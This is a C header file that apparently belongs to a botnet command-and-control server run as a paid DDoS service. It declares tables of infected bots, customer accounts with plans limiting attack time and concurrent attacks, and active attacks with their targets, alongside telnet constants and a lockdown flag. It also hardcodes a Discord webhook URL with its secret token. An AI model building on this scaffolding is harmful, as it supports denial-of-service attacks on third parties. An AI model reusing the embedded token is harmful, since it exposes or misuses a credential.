#pragma once

#include <time.h>

#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3

#define MAX_LOGIN_TIME 30
#define BLOCK_SIZE 20
#define OVERFLOW_STRESS 100
#define PREFIX '.'
#define USERLOGS "user-logs"
#define WEBHOOK "https://discordapp.com/api/webhooks/736606191051866123/GB_Gt9PrGRwB-LFuDKpIlTQnthamnYCnt5mHhhxTW6CAZi8clxJhGfE6Jv6XZzTDZuof"
#define MAX_CONNS 999999
#define SCREENCLEAR "\033[1A\033[2J\033[1;1H"

int RATELIMIT;
int LOCKDOWN;
extern int max;
char encstr[BLOCK_SIZE];

extern char broadcast[100];
extern int broadcast_time;

struct bot_t
{
	int fd;
	char name[100];
	char address[30];
}bot[MAX_CONNS];

struct database_t
{
	int logged_in;
	time_t expiry;
	int seed;
	char user[100];
	char pass[100];
	char type[100];
	int cooldown;
	int concurrents;
	int attacktime;
}db[MAX_CONNS];

struct user_t
{
	int logging;
	int seed;
	time_t login_count;
	time_t cooldown_start;
	int cooldown;
	int locked;
	int chat_enabled;
	char name[100];
	int fd;
	char address[30];
	char username[100];
	char password[100];
	int concurrents;
}user[MAX_CONNS];

struct concurrents_t 
{
	time_t start;
	int timer;
	char username[100];
	char target[100];
}conn[MAX_CONNS];

struct blacklist_t 
{
	char addr[100];
}blacklist[MAX_CONNS];

struct tried_t
{
	char name[100];
}_tried[MAX_CONNS];

struct plans_t
{
	char name[100];
	int cooldown;
	int attacktime;
	int concurrent;
}plan[MAX_CONNS];

void epoll_remove_active_client(const int fd);
int epoll_get_clients();
void epoll_send_prompt(const int fd, const char *user);
